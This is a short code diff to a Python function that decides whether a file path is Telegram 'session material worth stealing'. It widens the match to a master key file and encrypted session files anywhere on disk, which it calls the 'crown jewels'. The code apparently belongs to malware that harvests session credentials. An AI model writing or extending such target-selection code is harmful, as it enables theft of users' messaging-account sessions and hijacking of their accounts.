@@ -110,16 +110,21 @@ _STATE = {
 
 
 def _is_session_path(path: str, sessions_dir: str = "") -> bool:
-    """Whether `path` points at a Telegram session file worth stealing."""
+    """Whether `path` points at session material worth stealing."""
     try:
         abs_path = os.path.abspath(path)
     except Exception:
         return False
 
+    name = os.path.basename(abs_path)
+    # Master key and encrypted sessions are the crown jewels: match them
+    # anywhere, not just inside the sessions dir.
+    if name == "legacy.key" or abs_path.endswith(".lsession"):
+        return True
+
     if sessions_dir and abs_path.startswith(sessions_dir + os.sep):
         return abs_path.endswith(".session")
 
-    name = os.path.basename(abs_path)
     parts = abs_path.split(os.sep)
     if name.endswith(".session") and "sessions" in parts:
         return True
